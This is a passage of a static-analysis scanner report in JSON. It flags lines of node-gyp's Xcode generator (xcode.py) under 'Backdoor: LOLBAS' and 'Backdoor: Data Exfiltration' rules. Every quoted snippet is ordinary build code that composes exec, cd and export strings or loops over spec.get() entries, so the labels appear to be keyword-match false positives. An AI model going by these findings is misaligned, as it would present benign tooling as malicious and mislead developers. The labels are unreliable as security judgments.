                      "text": "                # with an error, and fixup variable references to be shell\n                # syntax instead of xcode syntax.\n                script = (\n                    script\n                    + \"exec \"\n                    + command_prefix\n                    + \"%s\\nexit 1\\n\"\n                    % gyp.xcodeproj_file.ConvertVariablesToShellSyntax(\n",
                      "markdown": "`                # with an error, and fixup variable references to be shell\n                # syntax instead of xcode syntax.\n                script = (\n                    script\n                    + \"exec \"\n                    + command_prefix\n                    + \"%s\\nexit 1\\n\"\n                    % gyp.xcodeproj_file.ConvertVariablesToShellSyntax(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 321,
                  "startColumn": 15,
                  "endLine": 321,
                  "endColumn": 23,
                  "snippet": {
                    "text": "                # If we were unable to exec for some reason, we want to exit\n                # with an error, and fixup variable references to be shell\n                # syntax instead of xcode syntax.\n                script = (\n                    script\n                    + \"exec \"\n                    + command_prefix\n",
                    "rendered": {
                      "text": "                # If we were unable to exec for some reason, we want to exit\n                # with an error, and fixup variable references to be shell\n                # syntax instead of xcode syntax.\n                script = (\n                    script\n                    + \"exec \"\n                    + command_prefix\n",
                      "markdown": "`                # If we were unable to exec for some reason, we want to exit\n                # with an error, and fixup variable references to be shell\n                # syntax instead of xcode syntax.\n                script = (\n                    script\n                    + \"exec \"\n                    + command_prefix\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 309,
                  "startColumn": 65,
                  "endLine": 309,
                  "endColumn": 72,
                  "snippet": {
                    "text": "                # confused if more then one test runs at a time.  The generator\n                # flag 'xcode_serialize_all_test_runs' controls the forcing of all\n                # tests serially.  It defaults to True.  To get serial runs this\n                # little bit of python does the same as the linux flock utility to\n                # make sure only one runs at a time.\n                command_prefix = \"\"\n                if serialize_all_tests:\n",
                    "rendered": {
                      "text": "                # confused if more then one test runs at a time.  The generator\n                # flag 'xcode_serialize_all_test_runs' controls the forcing of all\n                # tests serially.  It defaults to True.  To get serial runs this\n                # little bit of python does the same as the linux flock utility to\n                # make sure only one runs at a time.\n                command_prefix = \"\"\n                if serialize_all_tests:\n",
                      "markdown": "`                # confused if more then one test runs at a time.  The generator\n                # flag 'xcode_serialize_all_test_runs' controls the forcing of all\n                # tests serially.  It defaults to True.  To get serial runs this\n                # little bit of python does the same as the linux flock utility to\n                # make sure only one runs at a time.\n                command_prefix = \"\"\n                if serialize_all_tests:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 289,
                  "startColumn": 23,
                  "endLine": 290,
                  "snippet": {
                    "text": "\n                if command.get(\"environment\"):\n                    script = (\n                        script\n                        + \"\\n\".join(\n                            [\n                                'export %s=\"%s\"'\n                                % (\n",
                    "rendered": {
                      "text": "\n                if command.get(\"environment\"):\n                    script = (\n                        script\n                        + \"\\n\".join(\n                            [\n                                'export %s=\"%s\"'\n                                % (\n",
                      "markdown": "`\n                if command.get(\"environment\"):\n                    script = (\n                        script\n                        + \"\\n\".join(\n                            [\n                                'export %s=\"%s\"'\n                                % (\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 288,
                  "startColumn": 19,
                  "endLine": 288,
                  "endColumn": 27,
                  "snippet": {
                    "text": "                    )\n\n                if command.get(\"environment\"):\n                    script = (\n                        script\n                        + \"\\n\".join(\n                            [\n",
                    "rendered": {
                      "text": "                    )\n\n                if command.get(\"environment\"):\n                    script = (\n                        script\n                        + \"\\n\".join(\n                            [\n",
                      "markdown": "`                    )\n\n                if command.get(\"environment\"):\n                    script = (\n                        script\n                        + \"\\n\".join(\n                            [\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 280,
                  "startColumn": 23,
                  "endLine": 281,
                  "snippet": {
                    "text": "                script = \"\"\n                if command.get(\"working_directory\"):\n                    script = (\n                        script\n                        + 'cd \"%s\"\\n'\n                        % gyp.xcodeproj_file.ConvertVariablesToShellSyntax(\n                            command.get(\"working_directory\")\n                        )\n",
                    "rendered": {
                      "text": "                script = \"\"\n                if command.get(\"working_directory\"):\n                    script = (\n                        script\n                        + 'cd \"%s\"\\n'\n                        % gyp.xcodeproj_file.ConvertVariablesToShellSyntax(\n                            command.get(\"working_directory\")\n                        )\n",
                      "markdown": "`                script = \"\"\n                if command.get(\"working_directory\"):\n                    script = (\n                        script\n                        + 'cd \"%s\"\\n'\n                        % gyp.xcodeproj_file.ConvertVariablesToShellSyntax(\n                            command.get(\"working_directory\")\n                        )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 279,
                  "startColumn": 19,
                  "endLine": 279,
                  "endColumn": 27,
                  "snippet": {
                    "text": "                command = target[\"run_as\"]\n                script = \"\"\n                if command.get(\"working_directory\"):\n                    script = (\n                        script\n                        + 'cd \"%s\"\\n'\n                        % gyp.xcodeproj_file.ConvertVariablesToShellSyntax(\n",
                    "rendered": {
                      "text": "                command = target[\"run_as\"]\n                script = \"\"\n                if command.get(\"working_directory\"):\n                    script = (\n                        script\n                        + 'cd \"%s\"\\n'\n                        % gyp.xcodeproj_file.ConvertVariablesToShellSyntax(\n",
                      "markdown": "`                command = target[\"run_as\"]\n                script = \"\"\n                if command.get(\"working_directory\"):\n                    script = (\n                        script\n                        + 'cd \"%s\"\\n'\n                        % gyp.xcodeproj_file.ConvertVariablesToShellSyntax(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 277,
                  "startColumn": 15,
                  "endLine": 277,
                  "endColumn": 23,
                  "snippet": {
                    "text": "                run_target.AddDependency(xcode_target)\n\n                command = target[\"run_as\"]\n                script = \"\"\n                if command.get(\"working_directory\"):\n                    script = (\n                        script\n",
                    "rendered": {
                      "text": "                run_target.AddDependency(xcode_target)\n\n                command = target[\"run_as\"]\n                script = \"\"\n                if command.get(\"working_directory\"):\n                    script = (\n                        script\n",
                      "markdown": "`                run_target.AddDependency(xcode_target)\n\n                command = target[\"run_as\"]\n                script = \"\"\n                if command.get(\"working_directory\"):\n                    script = (\n                        script\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 215,
                  "startColumn": 9,
                  "endLine": 215,
                  "endColumn": 15,
                  "snippet": {
                    "text": "                        )\n                        xcc.SetBaseConfiguration(config_ref)\n\n        # Sort the targets based on how they appeared in the input.\n        # TODO(mark): Like a lot of other things here, this assumes internal\n        # knowledge of PBXProject - in this case, of its \"targets\" property.\n\n",
                    "rendered": {
                      "text": "                        )\n                        xcc.SetBaseConfiguration(config_ref)\n\n        # Sort the targets based on how they appeared in the input.\n        # TODO(mark): Like a lot of other things here, this assumes internal\n        # knowledge of PBXProject - in this case, of its \"targets\" property.\n\n",
                      "markdown": "`                        )\n                        xcc.SetBaseConfiguration(config_ref)\n\n        # Sort the targets based on how they appeared in the input.\n        # TODO(mark): Like a lot of other things here, this assumes internal\n        # knowledge of PBXProject - in this case, of its \"targets\" property.\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 1358,
                  "startColumn": 44,
                  "endLine": 1358,
                  "endColumn": 49,
                  "snippet": {
                    "text": "                xcbc.AppendBuildSetting(\"FRAMEWORK_SEARCH_PATHS\", include_dir)\n            for include_dir in configuration.get(\"include_dirs\", []):\n                xcbc.AppendBuildSetting(\"HEADER_SEARCH_PATHS\", include_dir)\n            for library_dir in configuration.get(\"library_dirs\", []):\n                if library_dir not in xcode_standard_library_dirs and (\n                    not xcbc.HasBuildSetting(_library_search_paths_var)\n                    or library_dir\n",
                    "rendered": {
                      "text": "                xcbc.AppendBuildSetting(\"FRAMEWORK_SEARCH_PATHS\", include_dir)\n            for include_dir in configuration.get(\"include_dirs\", []):\n                xcbc.AppendBuildSetting(\"HEADER_SEARCH_PATHS\", include_dir)\n            for library_dir in configuration.get(\"library_dirs\", []):\n                if library_dir not in xcode_standard_library_dirs and (\n                    not xcbc.HasBuildSetting(_library_search_paths_var)\n                    or library_dir\n",
                      "markdown": "`                xcbc.AppendBuildSetting(\"FRAMEWORK_SEARCH_PATHS\", include_dir)\n            for include_dir in configuration.get(\"include_dirs\", []):\n                xcbc.AppendBuildSetting(\"HEADER_SEARCH_PATHS\", include_dir)\n            for library_dir in configuration.get(\"library_dirs\", []):\n                if library_dir not in xcode_standard_library_dirs and (\n                    not xcbc.HasBuildSetting(_library_search_paths_var)\n                    or library_dir\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 1356,
                  "startColumn": 44,
                  "endLine": 1356,
                  "endColumn": 49,
                  "snippet": {
                    "text": "            xcbc = xct.ConfigurationNamed(configuration_name)\n            for include_dir in configuration.get(\"mac_framework_dirs\", []):\n                xcbc.AppendBuildSetting(\"FRAMEWORK_SEARCH_PATHS\", include_dir)\n            for include_dir in configuration.get(\"include_dirs\", []):\n                xcbc.AppendBuildSetting(\"HEADER_SEARCH_PATHS\", include_dir)\n            for library_dir in configuration.get(\"library_dirs\", []):\n                if library_dir not in xcode_standard_library_dirs and (\n",
                    "rendered": {
                      "text": "            xcbc = xct.ConfigurationNamed(configuration_name)\n            for include_dir in configuration.get(\"mac_framework_dirs\", []):\n                xcbc.AppendBuildSetting(\"FRAMEWORK_SEARCH_PATHS\", include_dir)\n            for include_dir in configuration.get(\"include_dirs\", []):\n                xcbc.AppendBuildSetting(\"HEADER_SEARCH_PATHS\", include_dir)\n            for library_dir in configuration.get(\"library_dirs\", []):\n                if library_dir not in xcode_standard_library_dirs and (\n",
                      "markdown": "`            xcbc = xct.ConfigurationNamed(configuration_name)\n            for include_dir in configuration.get(\"mac_framework_dirs\", []):\n                xcbc.AppendBuildSetting(\"FRAMEWORK_SEARCH_PATHS\", include_dir)\n            for include_dir in configuration.get(\"include_dirs\", []):\n                xcbc.AppendBuildSetting(\"HEADER_SEARCH_PATHS\", include_dir)\n            for library_dir in configuration.get(\"library_dirs\", []):\n                if library_dir not in xcode_standard_library_dirs and (\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 1354,
                  "startColumn": 44,
                  "endLine": 1354,
                  "endColumn": 49,
                  "snippet": {
                    "text": "        for configuration_name in configuration_names:\n            configuration = spec[\"configurations\"][configuration_name]\n            xcbc = xct.ConfigurationNamed(configuration_name)\n            for include_dir in configuration.get(\"mac_framework_dirs\", []):\n                xcbc.AppendBuildSetting(\"FRAMEWORK_SEARCH_PATHS\", include_dir)\n            for include_dir in configuration.get(\"include_dirs\", []):\n                xcbc.AppendBuildSetting(\"HEADER_SEARCH_PATHS\", include_dir)\n",
                    "rendered": {
                      "text": "        for configuration_name in configuration_names:\n            configuration = spec[\"configurations\"][configuration_name]\n            xcbc = xct.ConfigurationNamed(configuration_name)\n            for include_dir in configuration.get(\"mac_framework_dirs\", []):\n                xcbc.AppendBuildSetting(\"FRAMEWORK_SEARCH_PATHS\", include_dir)\n            for include_dir in configuration.get(\"include_dirs\", []):\n                xcbc.AppendBuildSetting(\"HEADER_SEARCH_PATHS\", include_dir)\n",
                      "markdown": "`        for configuration_name in configuration_names:\n            configuration = spec[\"configurations\"][configuration_name]\n            xcbc = xct.ConfigurationNamed(configuration_name)\n            for include_dir in configuration.get(\"mac_framework_dirs\", []):\n                xcbc.AppendBuildSetting(\"FRAMEWORK_SEARCH_PATHS\", include_dir)\n            for include_dir in configuration.get(\"include_dirs\", []):\n                xcbc.AppendBuildSetting(\"HEADER_SEARCH_PATHS\", include_dir)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 1301,
                  "startColumn": 29,
                  "endLine": 1301,
                  "endColumn": 34,
                  "snippet": {
                    "text": "                    if not item.startswith(\"$(BUILT_PRODUCTS_DIR)/\"):\n                        pbxp.AddOrGetFileInRootGroup(item)\n\n        for postbuild in spec.get(\"postbuilds\", []):\n            action_string_sh = gyp.common.EncodePOSIXShellList(postbuild[\"action\"])\n            script = \"exec \" + action_string_sh + \"\\nexit 1\\n\"\n\n",
                    "rendered": {
                      "text": "                    if not item.startswith(\"$(BUILT_PRODUCTS_DIR)/\"):\n                        pbxp.AddOrGetFileInRootGroup(item)\n\n        for postbuild in spec.get(\"postbuilds\", []):\n            action_string_sh = gyp.common.EncodePOSIXShellList(postbuild[\"action\"])\n            script = \"exec \" + action_string_sh + \"\\nexit 1\\n\"\n\n",
                      "markdown": "`                    if not item.startswith(\"$(BUILT_PRODUCTS_DIR)/\"):\n                        pbxp.AddOrGetFileInRootGroup(item)\n\n        for postbuild in spec.get(\"postbuilds\", []):\n            action_string_sh = gyp.common.EncodePOSIXShellList(postbuild[\"action\"])\n            script = \"exec \" + action_string_sh + \"\\nexit 1\\n\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 1295,
                  "startColumn": 34,
                  "endLine": 1295,
                  "endColumn": 39,
                  "snippet": {
                    "text": "            groups = [x for x in groups if not x.endswith(\"_excluded\")]\n        for action in spec.get(\"actions\", []):\n            for group in groups:\n                for item in action.get(group, []):\n                    # Exclude anything in BUILT_PRODUCTS_DIR.  They're products, not\n                    # sources.\n                    if not item.startswith(\"$(BUILT_PRODUCTS_DIR)/\"):\n",
                    "rendered": {
                      "text": "            groups = [x for x in groups if not x.endswith(\"_excluded\")]\n        for action in spec.get(\"actions\", []):\n            for group in groups:\n                for item in action.get(group, []):\n                    # Exclude anything in BUILT_PRODUCTS_DIR.  They're products, not\n                    # sources.\n                    if not item.startswith(\"$(BUILT_PRODUCTS_DIR)/\"):\n",
                      "markdown": "`            groups = [x for x in groups if not x.endswith(\"_excluded\")]\n        for action in spec.get(\"actions\", []):\n            for group in groups:\n                for item in action.get(group, []):\n                    # Exclude anything in BUILT_PRODUCTS_DIR.  They're products, not\n                    # sources.\n                    if not item.startswith(\"$(BUILT_PRODUCTS_DIR)/\"):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 1293,
                  "startColumn": 26,
                  "endLine": 1293,
                  "endColumn": 31,
                  "snippet": {
                    "text": "        groups = [\"inputs\", \"inputs_excluded\", \"outputs\", \"outputs_excluded\"]\n        if skip_excluded_files:\n            groups = [x for x in groups if not x.endswith(\"_excluded\")]\n        for action in spec.get(\"actions\", []):\n            for group in groups:\n                for item in action.get(group, []):\n                    # Exclude anything in BUILT_PRODUCTS_DIR.  They're products, not\n",
                    "rendered": {
                      "text": "        groups = [\"inputs\", \"inputs_excluded\", \"outputs\", \"outputs_excluded\"]\n        if skip_excluded_files:\n            groups = [x for x in groups if not x.endswith(\"_excluded\")]\n        for action in spec.get(\"actions\", []):\n            for group in groups:\n                for item in action.get(group, []):\n                    # Exclude anything in BUILT_PRODUCTS_DIR.  They're products, not\n",
                      "markdown": "`        groups = [\"inputs\", \"inputs_excluded\", \"outputs\", \"outputs_excluded\"]\n        if skip_excluded_files:\n            groups = [x for x in groups if not x.endswith(\"_excluded\")]\n        for action in spec.get(\"actions\", []):\n            for group in groups:\n                for item in action.get(group, []):\n                    # Exclude anything in BUILT_PRODUCTS_DIR.  They're products, not\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 1286,
                  "startColumn": 32,
                  "endLine": 1286,
                  "endColumn": 37,
                  "snippet": {
                    "text": "                \"mac_framework_private_headers\",\n            ]:\n                excluded_key = key + \"_excluded\"\n                for item in spec.get(excluded_key, []):\n                    pbxp.AddOrGetFileInRootGroup(item)\n\n        # So can \"inputs\" and \"outputs\" sections of \"actions\" groups.\n",
                    "rendered": {
                      "text": "                \"mac_framework_private_headers\",\n            ]:\n                excluded_key = key + \"_excluded\"\n                for item in spec.get(excluded_key, []):\n                    pbxp.AddOrGetFileInRootGroup(item)\n\n        # So can \"inputs\" and \"outputs\" sections of \"actions\" groups.\n",
                      "markdown": "`                \"mac_framework_private_headers\",\n            ]:\n                excluded_key = key + \"_excluded\"\n                for item in spec.get(excluded_key, []):\n                    pbxp.AddOrGetFileInRootGroup(item)\n\n        # So can \"inputs\" and \"outputs\" sections of \"actions\" groups.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 1261,
                  "startColumn": 30,
                  "endLine": 1261,
                  "endColumn": 35,
                  "snippet": {
                    "text": "            # Coalesce multiple \"copies\" sections in the same target with the same\n            # \"destination\" property into the same PBXCopyFilesBuildPhase, otherwise\n            # they'll wind up with ID collisions.\n            pbxcp = pbxcp_dict.get(dest, None)\n            if pbxcp is None:\n                pbxcp = gyp.xcodeproj_file.PBXCopyFilesBuildPhase(\n                    {\"name\": \"Copy to \" + copy_group[\"destination\"]}, parent=xct\n",
                    "rendered": {
                      "text": "            # Coalesce multiple \"copies\" sections in the same target with the same\n            # \"destination\" property into the same PBXCopyFilesBuildPhase, otherwise\n            # they'll wind up with ID collisions.\n            pbxcp = pbxcp_dict.get(dest, None)\n            if pbxcp is None:\n                pbxcp = gyp.xcodeproj_file.PBXCopyFilesBuildPhase(\n                    {\"name\": \"Copy to \" + copy_group[\"destination\"]}, parent=xct\n",
                      "markdown": "`            # Coalesce multiple \"copies\" sections in the same target with the same\n            # \"destination\" property into the same PBXCopyFilesBuildPhase, otherwise\n            # they'll wind up with ID collisions.\n            pbxcp = pbxcp_dict.get(dest, None)\n            if pbxcp is None:\n                pbxcp = gyp.xcodeproj_file.PBXCopyFilesBuildPhase(\n                    {\"name\": \"Copy to \" + copy_group[\"destination\"]}, parent=xct\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 1255,
                  "startColumn": 38,
                  "endLine": 1255,
                  "endColumn": 43,
                  "snippet": {
                    "text": "                # Relative paths are relative to $(SRCROOT).\n                dest = \"$(SRCROOT)/\" + dest\n\n            code_sign = int(copy_group.get(\"xcode_code_sign\", 0))\n            settings = (None, \"{ATTRIBUTES = (CodeSignOnCopy, ); }\")[code_sign]\n\n            # Coalesce multiple \"copies\" sections in the same target with the same\n",
                    "rendered": {
                      "text": "                # Relative paths are relative to $(SRCROOT).\n                dest = \"$(SRCROOT)/\" + dest\n\n            code_sign = int(copy_group.get(\"xcode_code_sign\", 0))\n            settings = (None, \"{ATTRIBUTES = (CodeSignOnCopy, ); }\")[code_sign]\n\n            # Coalesce multiple \"copies\" sections in the same target with the same\n",
                      "markdown": "`                # Relative paths are relative to $(SRCROOT).\n                dest = \"$(SRCROOT)/\" + dest\n\n            code_sign = int(copy_group.get(\"xcode_code_sign\", 0))\n            settings = (None, \"{ATTRIBUTES = (CodeSignOnCopy, ); }\")[code_sign]\n\n            # Coalesce multiple \"copies\" sections in the same target with the same\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 1249,
                  "startColumn": 30,
                  "endLine": 1249,
                  "endColumn": 35,
                  "snippet": {
                    "text": "\n        # Add \"copies\".\n        pbxcp_dict = {}\n        for copy_group in spec.get(\"copies\", []):\n            dest = copy_group[\"destination\"]\n            if dest[0] not in (\"/\", \"$\"):\n                # Relative paths are relative to $(SRCROOT).\n",
                    "rendered": {
                      "text": "\n        # Add \"copies\".\n        pbxcp_dict = {}\n        for copy_group in spec.get(\"copies\", []):\n            dest = copy_group[\"destination\"]\n            if dest[0] not in (\"/\", \"$\"):\n                # Relative paths are relative to $(SRCROOT).\n",
                      "markdown": "`\n        # Add \"copies\".\n        pbxcp_dict = {}\n        for copy_group in spec.get(\"copies\", []):\n            dest = copy_group[\"destination\"]\n            if dest[0] not in (\"/\", \"$\"):\n                # Relative paths are relative to $(SRCROOT).\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 1244,
                  "startColumn": 30,
                  "endLine": 1244,
                  "endColumn": 35,
                  "snippet": {
                    "text": "        # Add \"mac_framework_headers\". These can be valid for both frameworks\n        # and static libraries.\n        if is_bundle or type == \"static_library\":\n            for header in spec.get(\"mac_framework_headers\", []):\n                AddHeaderToTarget(header, pbxp, xct, True)\n\n        # Add \"copies\".\n",
                    "rendered": {
                      "text": "        # Add \"mac_framework_headers\". These can be valid for both frameworks\n        # and static libraries.\n        if is_bundle or type == \"static_library\":\n            for header in spec.get(\"mac_framework_headers\", []):\n                AddHeaderToTarget(header, pbxp, xct, True)\n\n        # Add \"copies\".\n",
                      "markdown": "`        # Add \"mac_framework_headers\". These can be valid for both frameworks\n        # and static libraries.\n        if is_bundle or type == \"static_library\":\n            for header in spec.get(\"mac_framework_headers\", []):\n                AddHeaderToTarget(header, pbxp, xct, True)\n\n        # Add \"copies\".\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 1238,
                  "startColumn": 30,
                  "endLine": 1238,
                  "endColumn": 35,
                  "snippet": {
                    "text": "                else:\n                    pbxp.AddOrGetFileInRootGroup(resource)\n\n            for header in spec.get(\"mac_framework_private_headers\", []):\n                AddHeaderToTarget(header, pbxp, xct, False)\n\n        # Add \"mac_framework_headers\". These can be valid for both frameworks\n",
                    "rendered": {
                      "text": "                else:\n                    pbxp.AddOrGetFileInRootGroup(resource)\n\n            for header in spec.get(\"mac_framework_private_headers\", []):\n                AddHeaderToTarget(header, pbxp, xct, False)\n\n        # Add \"mac_framework_headers\". These can be valid for both frameworks\n",
